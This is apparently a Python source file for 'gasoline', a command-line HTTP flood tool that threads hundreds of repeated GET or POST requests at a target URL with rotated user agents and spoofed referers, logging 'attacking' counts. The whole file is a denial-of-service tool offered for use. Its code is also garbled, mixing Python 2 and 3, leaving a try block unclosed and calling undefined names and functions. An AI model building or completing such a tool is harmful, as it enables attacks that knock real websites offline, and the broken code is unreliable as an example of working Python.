import requests
import threading,argparse,sys,random,time
from colorama import Fore
from random import choice

total=0
url=''
thread=0
data=''
banner='''              
                                                                      
                                                   /'                 
                                                 /'                   
           ____     ____     ____     ____     /'   O  ,____     ____ 
         /'    )  /'    )  /'    )--/'    )--/'   /'  /'    )  /'    )
       /'    /' /'    /'  '---,   /'    /' /'   /'  /'    /' /(___,/' 
      (___,/(__(___,/(__(___,/   (___,/'  (__  (__/'    /(__(________ 
         /'                                                           
 /     /'                                                             
(___,/'                                                               
                           
\n\t\tprogram : gasoline
\n\t\tversion : 2.0
\n\t\tlicence : GPU GPLv3
\n\t\tauthor  : jijue
\n\t\tgithub  : https://github.com/bigblackhat                         
'''

red=Fore.RED
green=Fore.GREEN
blue=Fore.BLUE
reset=Fore.RESET

useragents=['Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 YaBrowser/1.7.1364.22194 Safari/537.22',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/28.0.1500.71 Chrome/28.0.1500.71 Safari/537.36',]


def get_time():
	return '[' + time.strftime('%H:%M:%S',time.localtime()) + ']'
	
def print_highlight(message):
	time=get_time()
	level={'ERROR':red,'INFO':green,'HINT':blue}
	for lev,color in level.items():
		if lev in message:
			print(color+time+message+reset)



class gasoline(threading.Thread):
    thread=None
    timeout=None
    url=None
    socks=[]
    total=0

    def __init__(self):
        threading.Thread.__init__(self)
        self.req_type=options.req_type
        self.options=options
        self.thread=options.thread
        self.target=options.url
        self.parseurl()
        self.referers=[
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.google.com/',
            'http://'+self.host+'/'
        ]
    def parseurl(self):
        parsedurl=urlparse.urlparse(self.target)
        self.host=parsedurl.netloc.split(':')[0]
        self.url=parsedurl.path
        self.port=parsedurl.port
        if not self.port:
            port=80

    def Fire(self):
        try:
            for i in range(self.thread):
                gaso=httplib.HTTPConnection(self.host,self.port)
            for conn_req in self.socks:
                total+=1
                conn_req.request(method.upper(),self.target,self.req_type)
                print_highlight('[HINT] attacking ' + self.target + ' ' + str(total) + 'times')
                if self.options.wait != 0:
                    time.sleep(self.options.wait)
                    if options.verbose:
                        print_highlight('[INFO] sleeping ' + str(self.options.wait) + ' second to request')


def lead(options):
    try:
        run=gasoline(options)
        run.Fire()
    except Exception as e:
        print e
        print_highlight('[WARN] Failed to start gasoline')


def main():
	parser=argparse.ArgumentParser()
    parser.add_argument('-m','--method',default='get',dest='req_type',
                        choice=['GET','get','POST','post'],metavar='',
                        help='specify request method , get or post (default get)')
    parser.add_argument('-i','--info',action='store_true',dest='info',
                        help='show develop information of gasoline')
	parser.add_argument('-t','--thread',dest='thread',
                        help='specify the max number of request parameters',
                        default=500,type=int)
    parser.add_argument('-o','--timeout',type=float,default=0,
                        dest='timeout',metavar='',
                        help='timeout to parse web page (default 0)')
    parser.add_argument('-u','--url',metavar='',dest='url',
                        help='target url to attack')
    options=parser.parse_args()

	if options.info:
        print_highlight('[INFO]'+banner)

    options.req_type=options.req_type.upper()

    if options.target is None:
        print_highlight('[ERROR] the argument -u is required')
        sys.exit()

    print_hightlight('[INFO] gasoline is starting...')
    attack(options)

if __name__=='__main__':
	main()

